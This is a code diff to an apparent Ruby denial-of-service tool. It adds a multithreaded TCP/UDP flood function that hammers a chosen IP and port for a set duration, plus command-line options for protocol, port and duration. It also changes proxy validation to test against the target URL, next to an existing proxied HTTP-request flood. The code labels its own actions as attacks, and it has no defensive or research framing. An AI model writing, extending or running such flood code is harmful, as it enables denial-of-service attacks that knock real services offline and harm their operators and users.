@@ -3,6 +3,7 @@ require 'uri'
 require 'optparse'
 require 'thread'
 require 'socket'
+require 'open-uri'
 
 # ANSI color codes for styling
 def green_bold(text)
@@ -53,14 +54,13 @@ def generate_headers
 end
 
 # Validate proxies before use
-def validate_proxies(proxies)
+def validate_proxies(proxies, test_url)
   valid_proxies = []
-  test_url = "https://example.com"
 
   proxies.each do |proxy|
     begin
-      uri = URI.parse(test_url)
       proxy_uri = URI.parse("http://#{proxy}")
+      uri = URI.parse(test_url)
       http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
       http.use_ssl = (uri.scheme == "https")
       http.open_timeout = 5
@@ -71,10 +71,10 @@ def validate_proxies(proxies)
         puts green_bold("[+] Valid proxy: #{proxy}")
         valid_proxies << proxy
       else
-        puts red_bold("[-] Invalid proxy: #{proxy}")
+        puts red_bold("[-] Invalid proxy (bad response): #{proxy}")
       end
-    rescue
-      puts red_bold("[-] Failed to connect: #{proxy}")
+    rescue => e
+      puts red_bold("[-] Failed to connect: #{proxy} - #{e.message}")
     end
   end
 
@@ -147,6 +147,40 @@ def stress_test_layer7(url, threads, requests_per_thread, proxies, method, delay
   puts green_bold("[+] Layer 7 stress test completed.")
 end
 
+# Layer 4: TCP/UDP Flood
+def flood_layer4(target_ip, target_port, protocol, threads, duration)
+  puts green_bold("[+] Starting Layer 4 attack on #{target_ip}:#{target_port} with protocol #{protocol.upcase}")
+  end_time = Time.now + duration
+
+  thread_pool = [] # Array to store threads
+
+  threads.times do
+    thread_pool << Thread.new do
+      while Time.now < end_time
+        begin
+          case protocol.downcase
+          when "tcp"
+            socket = TCPSocket.new(target_ip, target_port)
+            socket.write("FloodData#{rand(1000)}")
+            socket.close
+          when "udp"
+            socket = UDPSocket.new
+            socket.send("FloodData#{rand(1000)}", 0, target_ip, target_port)
+            socket.close
+          else
+            raise red_bold("[!] Unsupported protocol: #{protocol}")
+          end
+        rescue => e
+          puts red_bold("[!] Error: #{e.message}")
+        end
+      end
+    end
+  end
+
+  thread_pool.each(&:join) # Join all threads
+  puts green_bold("[+] Layer 4 attack completed.")
+end
+
 # Parse command-line options
 options = {}
 OptionParser.new do |opts|
@@ -176,8 +210,20 @@ OptionParser.new do |opts|
     options[:delay] = delay
   end
 
-  opts.on("-l", "--layer LAYER", Integer, "Layer of attack: 7 (Application Layer)") do |layer|
+  opts.on("-l", "--layer LAYER", Integer, "Layer of attack: 4 (Transport Layer), 7 (Application Layer)") do |layer|
     options[:layer] = layer
+  end
+
+  opts.on("--protocol PROTOCOL", "Protocol to use for Layer 4 (TCP, UDP)") do |protocol|
+    options[:protocol] = protocol
+  end
+
+  opts.on("--port PORT", Integer, "Port to target for Layer 4") do |port|
+    options[:port] = port
+  end
+
+  opts.on("--duration DURATION", Integer, "Duration of Layer 4 attack in seconds") do |duration|
+    options[:duration] = duration
   end
 end.parse!
 
@@ -194,6 +240,9 @@ proxy_file = options[:proxy_file]
 method = options[:method] || "GET"
 delay = options[:delay] || 100
 layer = options[:layer] || 7
+protocol = options[:protocol] || "tcp"
+port = options[:port] || 80
+duration = options[:duration] || 60
 
 # Load proxies if provided
 proxies = []
@@ -203,7 +252,7 @@ if proxy_file
     proxies = File.readlines(proxy_file).map(&:strip)
     proxy_enabled = true
     puts green_bold("[+] Loaded #{proxies.size} proxies from #{proxy_file}")
-    proxies = validate_proxies(proxies) # Validate proxies
+    proxies = validate_proxies(proxies, url) # Validate proxies
   rescue Errno::ENOENT
     puts red_bold("[!] Error: Proxy file not found.")
     exit
@@ -216,6 +265,9 @@ attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, 
 
 if layer == 7
   stress_test_layer7(url, threads, requests_per_thread, proxies, method, delay)
+elsif layer == 4
+  target_ip = URI.parse(url).host rescue url # Extract IP from URL
+  flood_layer4(target_ip, port, protocol, threads, duration)
 else
-  puts red_bold("[!] Invalid layer specified. Currently supports only Layer 7.")
+  puts red_bold("[!] Invalid layer specified. Choose 4 or 7.")
 end
